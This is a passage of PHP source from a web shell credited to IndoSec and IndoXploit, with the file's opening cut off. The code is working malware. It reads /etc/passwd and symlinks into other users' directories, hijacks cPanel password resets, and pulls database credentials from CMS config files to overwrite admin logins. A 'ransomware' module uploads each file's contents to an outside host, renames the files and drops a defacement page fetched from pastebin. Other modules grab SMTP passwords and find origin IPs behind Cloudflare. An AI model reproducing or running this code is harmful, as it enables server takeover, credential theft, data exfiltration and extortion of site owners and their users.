					<table class='text-center table-responsive'>
						<thead class='bg-info'>
							<th>Users</th>
							<th>symlink</th>
							<th>FTP</th>
						</thead>";
						flush();
						$fil3 = file('passwd.txt');
						foreach ($fil3 as $f){
							$u=explode(':', $f);
							$user = $u['0'];
							echo "<tr>
								<td class='text-left pl-1'>$user</td>
								<td>
									<a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
								</td>
								<td>
									<a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
								</td>
							</tr>";
					flush();
					flush();
				}
				die ("</tr></table></div>");
			}

		}

		echo "read /etc/passwd
		<form method='post' action='?dir=$dir&aksi=sym_bypas&save=1'>
			<textarea class='form-control' rows='8' name='file'>";
				flush();
				$file = '/etc/passwd';
				$r3ad = @fopen($file, 'r');
				if ($r3ad){
					$content = @fread($r3ad, @filesize($file));
					echo "".htmlentities($content)."";
				}elseif(!$r3ad) {
					$r3ad = @show_source($file) ;
				}elseif(!$r3ad) {
					$r3ad = @highlight_file($file);
				}elseif(!$r3ad) {

					for($uid=0;$uid<1000;$uid++){
					$ara = posix_getpwuid($uid);
					if (!empty($ara)) {
						while (list ($key, $val) = each($ara)){
							print "$val:";
						}
						print "\n";
					}
				}
			}
			flush();
			echo "</textarea><br/>
			<input type='submit' class='btn btn-danger btn-block' value='Symlink'/>
		</form>";
		flush();
		exit;
	}
	
	
	
	/*
		* Auto Reset Cpanel
	*/
	if ($_GET['aksi'] == 'resetpasscp') {
		echo '<h5 class="text-center"><i class="fa fa-key"></i> Auto Reset Password Cpanel</h5>
		<form method="POST">
			<div class="form-group">
				<input type="email" name="email" class="form-control" placeholder="Masukan Email..."/><br/>
				<input type="submit" name="submit" class="btn btn-danger btn-block" value="Send"/>
			</div>
		</form>';
		
		if(isset($_POST['submit'])){
			$user = get_current_user();
			$site = $_SERVER['HTTP_HOST'];
			$ips = getenv('REMOTE_ADDR');
			$email = $_POST['email'];
			$wr = 'email:'.$email;
			$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
			fwrite($f, $wr); 
			fclose($f);
			$f = fopen('/home/'.$user.'/.contactinfo', 'w');
			fwrite($f, $wr); 
			fclose($f);
			$parm = $site.':2082/resetpass?start=1';
			echo '<br/>Url: '.$parm.'';
			echo '<br/>Username: '.$user.'';
			echo '<br/>Success Reset To: '.$email.'<br/><br/>';
		}
		exit;
	}
	
	
	/*
		* Auto Edit User
		* IndoXploit
	*/
	if($_GET['aksi'] == 'auteduser') {
		if($_POST['hajar']) {
			if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
				echo "Username dan Password harus lebih dari 6 karakter";
			} else {
				$user_baru = $_POST['user_baru'];
				$pass_baru = md5($_POST['pass_baru']);
				$conf = $_POST['config_dir'];
				$scan_conf = scandir($conf);
				foreach($scan_conf as $file_conf) {
					if(!is_file("$conf/$file_conf")) continue;
					$config = file_get_contents("$conf/$file_conf");
					if(preg_match("/JConfig|joomla/",$config)) {
						$dbhost = ambilkata($config,"host = '","'");
						$dbuser = ambilkata($config,"user = '","'");
						$dbpass = ambilkata($config,"password = '","'");
						$dbname = ambilkata($config,"db = '","'");
						$dbprefix = ambilkata($config,"dbprefix = '","'");
						$prefix = $dbprefix."users";
						$conn = mysql_connect($dbhost,$dbuser,$dbpass);
						$db = mysql_select_db($dbname);
						$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
						$result = mysql_fetch_array($q);
						$id = $result['id'];
						$site = ambilkata($config,"sitename = '","'");
						$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
						echo "Config => ".$file_conf."<br>";
						echo "CMS => Joomla<br>";
						if($site == '') {
							echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
						} else {
							echo "Sitename => $site<br>";
						}
						if(!$update OR !$conn OR !$db) {
							echo "Status => <font color=red>".mysql_error()."</font><br><br>";
						} else {
							echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
						}
						mysql_close($conn);
					} elseif(preg_match("/WordPress/",$config)) {
						$dbhost = ambilkata($config,"DB_HOST', '","'");
						$dbuser = ambilkata($config,"DB_USER', '","'");
						$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
						$dbname = ambilkata($config,"DB_NAME', '","'");
						$dbprefix = ambilkata($config,"table_prefix  = '","'");
						$prefix = $dbprefix."users";
						$option = $dbprefix."options";
						$conn = mysql_connect($dbhost,$dbuser,$dbpass);
						$db = mysql_select_db($dbname);
						$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
						$result = mysql_fetch_array($q);
						$id = $result[ID];
						$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
						$result2 = mysql_fetch_array($q2);
						$target = $result2[option_value];
						if($target == '') {
						$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
						} else {
							$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
						}
						$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
						echo "Config => ".$file_conf."<br>";
						echo "CMS => Wordpress<br>";
						echo $url_target;
						if(!$update OR !$conn OR !$db) {
							echo "Status => <font color=red>".mysql_error()."</font><br><br>";
						} else {
							echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
						}
						mysql_close($conn);
					} elseif(preg_match("/Magento|Mage_Core/",$config)) {
						$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
						$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
						$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
						$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
						$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
						$prefix = $dbprefix."admin_user";
						$option = $dbprefix."core_config_data";
						$conn = mysql_connect($dbhost,$dbuser,$dbpass);
						$db = mysql_select_db($dbname);
						$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
						$result = mysql_fetch_array($q);
						$id = $result[user_id];
						$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
						$result2 = mysql_fetch_array($q2);
						$target = $result2[value];
						if($target == '') {
							$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
						} else {
							$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
						}
						$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
						echo "Config => ".$file_conf."<br>";
						echo "CMS => Magento<br>";
						echo $url_target;
						if(!$update OR !$conn OR !$db) {
							echo "Status => <font color=red>".mysql_error()."</font><br><br>";
						} else {
							echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
						}
						mysql_close($conn);
					} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
						$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
						$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
						$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
						$dbname = ambilkata($config,"'DB_DATABASE', '","'");
						$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
						$prefix = $dbprefix."user";
						$conn = mysql_connect($dbhost,$dbuser,$dbpass);
						$db = mysql_select_db($dbname);
						$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
						$result = mysql_fetch_array($q);
						$id = $result[user_id];
						$target = ambilkata($config,"HTTP_SERVER', '","'");
						if($target == '') {
							$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
						}
						$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
						echo "Config => ".$file_conf."<br>";
						echo "CMS => OpenCart<br>";
						echo $url_target;
						if(!$update OR !$conn OR !$db) {
							echo "Status => <font color=red>".mysql_error()."</font><br><br>";
						} else {
							echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
						}
						mysql_close($conn);
					} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
						$dbhost = ambilkata($config,'server = "','"');
						$dbuser = ambilkata($config,'username = "','"');
						$dbpass = ambilkata($config,'password = "','"');
						$dbname = ambilkata($config,'database = "','"');
						$prefix = "users";
						$option = "identitas";
						$conn = mysql_connect($dbhost,$dbuser,$dbpass);
						$db = mysql_select_db($dbname);
						$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
						$result = mysql_fetch_array($q);
						$target = $result[alamat_website];
						if($target == '') {
							$target2 = $result[url];
							$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
							if($target2 == '') {
								$url_target2 = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
							} else {
								$cek_login3 = file_get_contents("$target2/adminweb/");
								$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
								if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
									$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
								} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
									$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
								} else {
									$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
								}
							}
						} else {
							$cek_login = file_get_contents("$target/adminweb/");
							$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
								$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
								$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
						$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
						echo "Config => ".$file_conf."<br>";
						echo "CMS => Lokomedia<br>";
						if(preg_match('/Error, Tidak dapat mengambil nama domainnya/', $url_target)) {
							echo $url_target2;
						} else {
							echo $url_target;
						}
						if(!$update OR !$conn OR !$db) {
							echo "Status => <font color=red>".mysql_error()."</font><br><br>";
						} else {
							echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
						}
						mysql_close($conn);
					}
				}
			}
		} else {
			echo "
			<h4 class='text-center mb-5'>Auto Edit User</h4>
			<form method='post'>
				<h5>Lokasi Dir Config</h5>
				<input type='text' class='form-control mb-3' name='config_dir' value='$dir'>
				<h5>Set User & Pass :</h5>
				<input type='text' name='user_baru' value='indosec' class='form-control mb-3' placeholder='Username Baru'>
				<input type='text' name='pass_baru' value='indosec' class='form-control mb-4' placeholder='Password Baru'>
				<input type='submit' name='hajar' value='Edit User' class='btn btn-danger btn-block'>
			</form>
			<p class='text-muted mb-4'>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</p>";
		}
		exit;
	}
	
	
	/*
		* Ransomware
	*/
	if ($_GET['aksi'] == 'ransom') {
		echo '<form method="post">
			<div class="form-group">
				<h5 class="text-center"><i class="fa fa-lock"></i> Pilih Directory Yang Ingin Di Encrypt</h5>
				<input type="text" name="path" class="form-control mb-2" value="'.$dir.'"/><br/>
				<input type="submit" name="encrypt" class="btn btn-danger btn-block" value="Encrypt"/>
			</div>
		</form>';
	
		if(isset($_POST["encrypt"])) {
			$dir = $_POST["path"];
			echo"<textarea class='form-control mb-4' rows='10' disabled=''>";
			function listFolderFiles($dir){
				if (is_dir($dir)) {
					$ffs = scandir($dir);
					unset($ffs[array_search('.', $ffs, true)]);
					unset($ffs[array_search('..', $ffs, true)]);
					if (count($ffs) < 1)
					return;
					foreach($ffs as $ff){
						$files = $dir."/".$ff;
						if(!is_dir($files)){
							/* encrypt file */
							$file = file_get_contents($files);
							$_a = base64_encode($file);
							/* proses curl */
							$ch = curl_init();
							curl_setopt($ch, CURLOPT_URL, 'http://encrypt.indsc.me/api.php?type=encrypt');
							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
							curl_setopt($ch, CURLOPT_POSTFIELDS, "text=$_a");
							$x = json_decode(curl_exec($ch));
							if($x->status == 'success'){
								$_enc = base64_decode($x->data);
								rename($files, $files. ".indsc");
								echo "[+]$files => Success Encrypted\n";
							}
						}
						if(is_dir($dir.'/'.$ff)) listFolderFiles($dir.'/'.$ff);
					}
					$index = file_get_contents('https://pastebin.com/raw/aGZ6BeTH');
					$_o = fopen($dir."/index.html", "w");
					fwrite($_o, $index);
					fclose($_o);
					echo "\n[+] Done !";
				}else{
					echo "\nBukan dir";
				}
			}
			listFolderFiles($dir);
			echo "</textarea><br/>";
		}
		exit;
	}
	
	
	
	/*
		* SMTP Grabber
		* IndoXploit
	*/
	if ($_GET['aksi'] == 'smtpgrab') {
		function scj($path) {
			$paths = scandir($path);
			foreach($paths as $pathb) {
				if(!is_file("$path/$pathb")) continue;
				$ambil = file_get_contents("$path/$pathb");
				$ambil = str_replace("$", "", $ambil);
				if(preg_match("/JConfig|joomla/", $ambil)) {
					$smtp_host = ambilkata($ambil,"smtphost = '","'");
					$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
					$smtp_user = ambilkata($ambil,"smtpuser = '","'");
					$smtp_pass = ambilkata($ambil,"smtppass = '","'");
					$smtp_port = ambilkata($ambil,"smtpport = '","'");
					$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
					echo "<table class='text-white table table-bordered'>
						<tr>
							<td>SMTP Host: $smtp_host</td>
						</tr>
						<tr>
							<td>SMTP Port: $smtp_port</td>
						</tr>
						<tr>
							<td>SMTP User: $smtp_user</td>
						</tr>
						<tr>
							<td>SMTP Pass: $smtp_pass</td>
						</tr>
						<tr>
							<td>SMTP Auth: $smtp_auth</td>
						</tr>
						<tr>
							<td>SMTP Secure: $smtp_secure</td>
						</tr>
					</table>";
				}
			}
		}
		echo "<p class='text-muted'>NB : Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/namafolder_config )</p>";
		$smtp = scj($path);
		exit;
	}
	
	
	/*
		* Bypass Cloud Flare
	*/
	if ($_GET['aksi'] == 'bypascf') {
		echo '<form method="POST"><br>			
			<div class="form-group input-group">
				<select class="form-control" name="idsPilih">
					<option>Pilih Metode</option>
					<option>ftp</option>
					<option>direct-conntect</option>
					<option>Webmail</option>
					<option>Cpanel</option>
				</select>
			</div>
			<div class="form-group input-group">
				<input class="form-control" type="text" name="target" placeholder="Masukan Url">
				<input class="btn btn-danger form-control" type="submit" value="Bypass">
			</div><br>
		</form>';

		$target = $_POST['target'];
		
		# Bypass From FTP
		if($_POST['idsPilih'] == "ftp") {
			$ftp = gethostbyname("ftp."."$target");
			echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
			ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
		}
		
		# Bypass From Direct-Connect
		if($_POST['idsPilih'] == "direct-conntect") {
			$direct = gethostbyname("direct-connect."."$target");
			echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
			ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
		}
		
		# Bypass From Webmail
		if($_POST['idsPilih'] == "webmail") {
			$web = gethostbyname("webmail."."$target");
			echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
			ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
		}
		
		# Bypass From Cpanel
		if($_POST['idsPilih'] == "cpanel") {
			$cpanel = gethostbyname("cpanel."."$target");
			echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
			ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
		}
		exit;
	}
	
		if(isset($_GET['path'])){
			$path = $_GET['path'];
			chdir($path);
		}else{
			$path = getcwd();
		}
		$path = str_replace('\\','/',$path);
		$paths = explode('/',$path);
		echo "Path : ";
		foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
				echo '<a href="?dir=/">/</a>';
				continue;
			}
			if($pat == '') continue;
			echo '<a href="?dir=';
			for($i=0;$i<=$id;$i++){
				echo "$paths[$i]";
				if($i != $id) echo "/";
			}
			echo '">'.$pat.'</a>/';
		}
		$scandir = scandir($path);
		echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
		echo '<div id="tab"><table class="text-white mt-1 table-hover table-responsive">
			<thead class="bg-info text-center">
				<th class="text-left">File/Folder</th>
				<th>Size</th>
				<th>Permission</th>
				<th>Action</th>
			</thead>';
			
			foreach($scandir as $dir){

			/* cek jika ini berbentuk folder */
			/* cek jika nama folder karaker terlalu panjang */
			if (strlen($dir) > 18) {
				$_dir = substr($dir, 0, 18)."...";												
			}else{
				$_dir = $dir;
			}
			$_diir = $_dir;
			if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
			echo 
				'<tr>
					<td class="text-white"><img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" class="ico"></img> <a href="?dir='.$path.'/'.$dir.'">'.$_diir.'</a></td>
					<td class="text-white text-center">';
						echo "--";
					echo '</td>
					<td class="text-center">
					<a href="?dir='.$path.'/'.$dir.'&aksi=chmod_dir">
';
					if(is_writable($path.'/'.$dir)) echo '<font color="#00ff00">';
					elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
					echo perms($path.'/'.$dir);
					if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></a></td>
					<td class=""><center><a title="Rename" class="badge badge-success" href="?dir='.$path.'/'.$dir.'&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir='.$path.'/'.$dir.'&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
					</td>';
		}

			foreach($scandir as $file){

				/* cek jika ini berbentuk file */
				if(!is_file($path.'/'.$file)) continue;
				$size = filesize($path.'/'.$file)/1024;
				$size = round($size,3);

				if($size >= 1024){
					$size = round($size/1024,2).' MB';
				}else{
					$size = $size.' KB';
				}


				echo '<tr>
						<td><img src="';

					/* set image berdasarkan extensi file */
					$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
					if($ext == "php") {
						echo 'https://image.flaticon.com/icons/png/128/337/337947.png"';
					}elseif ($ext == "html") {
						echo 'https://image.flaticon.com/icons/png/128/136/136528.png"';
					}elseif ($ext == "css") {
						echo 'https://image.flaticon.com/icons/png/128/136/136527.png"';
					}elseif ($ext == "png") {
						echo 'https://image.flaticon.com/icons/png/128/136/136523.png"';
					}elseif ($ext == "jpg") {
						echo 'https://image.flaticon.com/icons/png/128/136/136524.png"';
					}elseif ($ext == "jpeg") {
						echo 'http://i.imgur.com/e8mkvPf.png"';
					}elseif($ext == "zip") {
						echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';
					}elseif ($ext == "js") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
					}elseif ($ext == "ttf") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
					}elseif ($ext == "otf") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
					}elseif ($ext == "txt") {
						echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
					}elseif ($ext == "ico") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
					}elseif ($ext == "conf") {
						echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
					}elseif ($ext == "htaccess") {
						echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
					}elseif ($ext == "sh") {
						echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
					}elseif ($ext == "py") {
						echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
					}elseif ($ext == "indsc") {
						echo 'https://image.flaticon.com/icons/png/512/1265/1265511.png';
					}elseif ($ext == "sql") {
						echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
					}elseif ($ext == "pl") {
						echo 'http://i.imgur.com/PnmX8H9.png';
					}elseif ($ext == "pdf") {
						echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
					}elseif ($ext == "mp4") {
						echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
					}elseif ($ext == "mp3") {
						echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
					}elseif ($ext == "git") {
						echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
					}elseif ($ext == "md") {
						echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
					}else{
						echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
					}
					echo '" class="ico2"></img>';

					/* cek jika karaker terlalu panjang */
					if (strlen($file) > 25) {
						$_file = substr($file, 0, 25)."...-.".$ext;												
					}else{
						$_file = $file;
					}

					echo' <a href="?dir='.$path.'&aksi=view&file='.$path.'/'.$file.'">'.$_file.'</a></td>
					<td class="text-center d-flex">'.$size.'</td>
					<td><a href="?dir='.$path.'&aksi=chmod&file='.$path.'/'.$file.'" class="text-center">';
					if(is_writable($path.'/'.$file)) echo '<font color="#00ff00">';
					elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
					echo perms($path.'/'.$file);
					if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font></a></td>
					<td class="text-center d-flex">
						<a title="Lihat" class="badge badge-info" href="?dir='.$path.'&aksi=view&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;
						<a title="Edit" class="badge badge-success" href="?dir='.$path.'&aksi=edit&file='.$path.'/'.$file.'">&nbsp;<i class="far fa-edit"></i>&nbsp;</a>&nbsp;&nbsp;
						<a title="Rename" class="badge badge-success" href="?dir='.$path.'&aksi=rename&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-pencil"></i>&nbsp;</a>&nbsp;&nbsp;
						<a class="badge badge-danger" href="?dir='.$path.'&aksi=hapusf&file='.$path.'/'.$file.'" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>&nbsp;&nbsp;
						<a class="badge badge-primary" href="?&dir='.$path.'&aksi=download&file='.$path.'/'.$file.'" title="Download">&nbsp;<i class="fa fa-download"></i>&nbsp;</a>
					</td>
				</tr>';
			}
		echo '</table></div><hr/>
		<center><a class="text-muted" href="https://facebook.com/IndoSecOfficial">Copyright 2019 { IndoSec }</a></center><br/>';	
		echo "<a href='#' class='scrollToTop'><i class='fa fa-arrow-up up' aria-hidden='true'></i></a>";
	/*  
		End
	*/
?>